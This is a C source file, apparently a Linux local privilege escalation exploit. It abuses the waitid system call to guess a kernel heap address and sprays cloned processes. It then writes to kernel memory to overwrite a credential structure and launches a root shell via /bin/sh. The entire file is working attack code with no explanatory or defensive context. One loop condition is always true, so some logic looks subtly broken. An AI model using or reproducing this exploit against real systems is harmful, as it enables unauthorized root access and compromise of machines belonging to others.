#define _GNU_SOURCE
#include <errno.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/auxv.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>
#include <wait.h>

#define STACK_SIZE   0x10000
#define HEAP_OFFSET  0x3b402014
#define SPRAY_COUNT  1000

int status;

unsigned long get_kernel_heap_base() 
{
    unsigned long start = 0xffff000000000000;
    unsigned long inc =   0x0000000010000000;
    unsigned long guess = start;
    
    while (guess != 0) {
        syscall(SYS_waitid, P_ALL, 0, guess, WEXITED, NULL);
        if (errno != EFAULT) {
            printf("[+] Found kernel heap base: 0x%lx\n", guess);
            return guess;
        }
        guess += inc;
    }
    
    return 0;
}

int get_shell()
{
    while (geteuid()) {
        usleep(100000);
        if (!status) {
            sleep(10000);
        }
    }
  
    printf("\n[+] Got euid = 0!\n");
    printf("[+] Notifying clones...\n");
    status = 0;
    
    setreuid(0, 0);
    setuid(0);
    
    printf("[+] euid: %d, uid: %d\n", geteuid(), getuid());
    system("/bin/sh");
    
    // TODO The kernel will now oops.  
 
    return 0;
}

int main(int argc, char **argv)
{
    void *stack[SPRAY_COUNT] = {NULL};
    unsigned long heap_base;
    pid_t pid; 

    setvbuf(stdout, NULL, _IONBF, 0);

    status = 1;

    printf("[-] Finding kernel heap base...\n");

    if (!(heap_base = get_kernel_heap_base())) {
        printf("[!] Failed to get kernel heap base...\n");
        return 0;
    }

    printf("[-] Spraying tasks...\n");
    
    for (int i = 0; i < SPRAY_COUNT; i++) {
        stack[i] = malloc(STACK_SIZE);
        pid = clone(get_shell, stack[i], CLONE_VM | SIGCHLD, NULL);
        if (pid == -1) {
            perror("[!] Impossible to clone()");
            return 1;
        }
    }

    printf("[-] Trying smash a cred struct...\n");

    for (unsigned long address = heap_base + HEAP_OFFSET; address < address + 0x100000 && status; address += 0x1000) {
        printf("\r[-] Writing to 0x%lx", address);
        syscall(SYS_waitid, P_ALL, 0, address, WEXITED|WNOHANG|__WNOTHREAD, NULL);
        usleep(100000);
    }
    
    for (int i = 0; i < SPRAY_COUNT; i++) { 
        wait(NULL);
        free(stack[i]);
    }
    
    return 0;
}

